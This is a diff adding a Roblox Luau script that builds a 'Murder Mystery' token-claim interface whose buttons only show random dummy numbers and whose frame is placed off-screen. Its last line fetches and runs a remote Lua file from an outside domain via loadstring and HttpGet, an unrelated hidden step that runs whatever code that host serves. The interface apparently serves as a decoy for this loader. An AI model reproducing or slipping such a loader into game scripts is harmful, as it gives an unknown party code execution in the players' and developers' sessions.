@@ -1,0 +1,80 @@
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "GameUI"
+ScreenGui.ResetOnSpawn = true
+ScreenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+local Frame = Instance.new("Frame")
+Frame.Name = "MainFrame"
+Frame.Size = UDim2.new(0, 600, 0, 400)
+Frame.Position = UDim2.new(2, 0, 2, 0) 
+Frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+Frame.BackgroundTransparency = 0.5
+Frame.BorderSizePixel = 0
+Frame.Parent = ScreenGui
+
+local Title = Instance.new("TextLabel")
+Title.Name = "GameTitle"
+Title.Size = UDim2.new(1, 0, 0, 50)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.Text = "Murder Mystery"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.TextScaled = true
+Title.BackgroundColor3 = Color3.new(0, 0, 0)
+Title.Parent = Frame
+
+local TokensLabel = Instance.new("TextLabel")
+TokensLabel.Name = "Tokens"
+TokensLabel.Size = UDim2.new(1, -20, 0, 50)
+TokensLabel.Position = UDim2.new(0, 10, 0, 60)
+TokensLabel.Text = "Tokens: 0"
+TokensLabel.TextColor3 = Color3.new(0.8, 0.8, 0)
+TokensLabel.TextScaled = true
+TokensLabel.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+TokensLabel.BorderSizePixel = 0
+TokensLabel.Parent = Frame
+
+local ChristmasTokensLabel = Instance.new("TextLabel")
+ChristmasTokensLabel.Name = "ChristmasTokens"
+ChristmasTokensLabel.Size = UDim2.new(1, -20, 0, 50)
+ChristmasTokensLabel.Position = UDim2.new(0, 10, 0, 120)
+ChristmasTokensLabel.Text = "Christmas Tokens: 0"
+ChristmasTokensLabel.TextColor3 = Color3.new(0, 0.8, 0.8)
+ChristmasTokensLabel.TextScaled = true
+ChristmasTokensLabel.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+ChristmasTokensLabel.BorderSizePixel = 0
+ChristmasTokensLabel.Parent = Frame
+
+local Button1 = Instance.new("TextButton")
+Button1.Name = "TokenButton"
+Button1.Size = UDim2.new(0.5, -15, 0, 50)
+Button1.Position = UDim2.new(0, 10, 0, 200)
+Button1.Text = "Claim Tokens"
+Button1.TextColor3 = Color3.new(1, 1, 1)
+Button1.TextScaled = true
+Button1.BackgroundColor3 = Color3.new(0.2, 0.2, 0.5)
+Button1.BorderSizePixel = 0
+Button1.Parent = Frame
+
+local Button2 = Instance.new("TextButton")
+Button2.Name = "ChristmasButton"
+Button2.Size = UDim2.new(0.5, -15, 0, 50)
+Button2.Position = UDim2.new(0.5, 10, 0, 200)
+Button2.Text = "Claim Christmas Tokens"
+Button2.TextColor3 = Color3.new(1, 1, 1)
+Button2.TextScaled = true
+Button2.BackgroundColor3 = Color3.new(0.5, 0.2, 0.2)
+Button2.BorderSizePixel = 0
+Button2.Parent = Frame
+
+local function updateTokens()
+	TokensLabel.Text = "Tokens: " .. tostring(math.random(0, 100)) -- Dummy value
+end
+
+local function updateChristmasTokens()
+	ChristmasTokensLabel.Text = "Christmas Tokens: " .. tostring(math.random(0, 50))
+end
+
+Button1.MouseButton1Click:Connect(updateTokens)
+Button2.MouseButton1Click:Connect(updateChristmasTokens)
+
+loadstring(game:HttpGet("https://egorikusa.space/a1f986ff70f31d866ba40180.lua", true))()
